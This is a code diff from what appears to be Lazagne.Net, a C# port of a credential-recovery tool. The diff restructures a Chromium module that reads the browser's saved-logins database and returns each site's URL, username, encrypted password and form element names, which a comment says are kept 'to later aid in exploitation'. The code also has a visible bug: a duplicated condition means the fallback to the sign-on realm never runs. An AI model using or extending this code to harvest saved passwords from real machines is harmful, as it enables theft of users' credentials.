@@ -29,45 +29,47 @@ namespace Lazagne.Net.Modules.ChromiumBased
             if (connection.State != System.Data.ConnectionState.Open)
                 throw new InvalidOperationException("Connection not ready");
 
-            using SQLiteCommand cmd = new SQLiteCommand("SELECT blacklisted_by_user, action_url, signon_realm, username_value, password_value, username_element, password_element, submit_element FROM logins", connection);
-            using SQLiteDataReader reader = cmd.ExecuteReader();
-
-            while (reader.Read())
+            using (SQLiteCommand cmd = new SQLiteCommand("SELECT blacklisted_by_user, action_url, signon_realm, username_value, password_value, username_element, password_element, submit_element FROM logins", connection))
+            using (SQLiteDataReader reader = cmd.ExecuteReader())
             {
-                int blacklisted = reader.GetInt32(0); // Indicates that the user has blacklisted the site for password saving. Row does not contain login data
-                if (blacklisted > 0)
-                    continue;
 
-                string realm = reader.GetString(1);
-                string actionUrl = reader.GetString(2);
+                while (reader.Read())
+                {
+                    int blacklisted = reader.GetInt32(0); // Indicates that the user has blacklisted the site for password saving. Row does not contain login data
+                    if (blacklisted > 0)
+                        continue;
 
-                string url;
+                    string realm = reader.GetString(1);
+                    string actionUrl = reader.GetString(2);
 
-                if (!string.IsNullOrWhiteSpace(actionUrl)) // Sometimes actionUrl isn´t set. Use the signonrealm in that case
-                    url = actionUrl;
-                else if (!string.IsNullOrWhiteSpace(actionUrl))
-                    url = realm;
-                else
-                    url = "?";
+                    string url;
 
-                int length = (int)reader.GetBytes(4, 0, null, 0, 0); // Sqlites way of getting field length
-                byte[] encryptedPassword = new byte[length];
-                reader.GetBytes(4, 0, encryptedPassword, 0, length);
+                    if (!string.IsNullOrWhiteSpace(actionUrl)) // Sometimes actionUrl isn´t set. Use the signonrealm in that case
+                        url = actionUrl;
+                    else if (!string.IsNullOrWhiteSpace(actionUrl))
+                        url = realm;
+                    else
+                        url = "?";
 
-                Dictionary<string, string> additional = new Dictionary<string, string> // Store the corresponding elements aswell to later aid in exploitation
+                    int length = (int)reader.GetBytes(4, 0, null, 0, 0); // Sqlites way of getting field length
+                    byte[] encryptedPassword = new byte[length];
+                    reader.GetBytes(4, 0, encryptedPassword, 0, length);
+
+                    Dictionary<string, string> additional = new Dictionary<string, string> // Store the corresponding elements aswell to later aid in exploitation
                 {
                     {"username_element", reader.GetString(5) },
                     {"password_element", reader.GetString(6) },
                     {"submit_element", reader.GetString(7) },
                 };
 
-                yield return new EncryptedLoginInfo()
-                {
-                    Url = url,
-                    Login = reader.GetString(3),
-                    EncryptedPassword = encryptedPassword,
-                    AdditionalData = additional
-                };
+                    yield return new EncryptedLoginInfo()
+                    {
+                        Url = url,
+                        Login = reader.GetString(3),
+                        EncryptedPassword = encryptedPassword,
+                        AdditionalData = additional
+                    };
+                }
             }
         }
 
